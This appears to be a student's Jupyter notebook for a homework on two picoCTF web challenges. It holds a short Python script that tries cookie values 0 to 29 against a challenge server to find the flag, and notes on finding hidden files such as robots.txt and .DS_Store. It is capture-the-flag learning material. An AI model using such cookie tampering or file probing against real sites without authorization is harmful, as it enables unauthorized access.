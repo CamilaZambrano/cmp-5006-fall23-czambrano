{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Homework 3: picoCTF Challenges 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Cookies"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**1. Trial:** tried some cookies and saw that the value change in the developer tools cookies section:\n",
    "- snickerdoodle - 0\n",
    "- gingerbread - 23\n",
    "- chocolate chip - 1\n",
    "- peanut butter - 5\n",
    "\n",
    "![Graph1](Cookies/inicio.png)\n",
    "![Graph2](Cookies/snicker.png)\n",
    "![Graph3](Cookies/ginger.png)\n",
    "\n",
    "**2. Check values:** Change the value ramdomly to see what happened and above 30 there were no cookies.  \n",
    "**3. Code:** Made a program that tries all 30 options to see which one is the correct one."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "name=18\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "for i in range(30):\n",
    "    cookie = 'name={}'.format(i)\n",
    "    headers = {'Cookie': cookie}\n",
    "    \n",
    "    try:\n",
    "        r = requests.get('http://mercury.picoctf.net:6418/check', headers=headers)\n",
    "        r.raise_for_status() # Raise exception if invalid response\n",
    "        \n",
    "        if 'picoCTF' in r.text:\n",
    "            print(cookie)\n",
    "    except requests.exceptions.RequestException as e:\n",
    "        print(f\"Error making request: {e}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**4. Obtain flag:** Then I modify the cookie value with 18 and obtained the flag.\n",
    "     \n",
    "![Graph4](Cookies/key.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Scavenger Hunt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**1. HTML:** search for anything in the HTLM code.  \n",
    "  \n",
    "![Graph1](Hunt/1.png)\n",
    "  \n",
    "**2. CSS:** search for anything in the linked css file.  \n",
    "  \n",
    "![Graph2](Hunt/2.png)\n",
    "  \n",
    "**3. JS:** search for anything in the linked java script file.  \n",
    "  \n",
    "![Graph3](Hunt/3.png)\n",
    "  \n",
    "**4. Google No Index:** Search in google how to no index pages and tries the .robots.txt.    \n",
    "  \n",
    "![Graph4](Hunt/4.png)\n",
    "\n",
    "![Graph5](Hunt/5.png)\n",
    "  \n",
    "**5. Apache Server**: Search in google information of Apache server and found something about access in wikipedia, so I tried it.  \n",
    "  \n",
    "![Graph6](Hunt/6.png)\n",
    "  \n",
    "![Graph7](Hunt/7.png)\n",
    "  \n",
    "**8. Mac Storage:** in mac theres a file called DS_Store, a file that stores custom attributes, so I tried that.  \n",
    "  \n",
    "![Graph8](Hunt/8.png)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
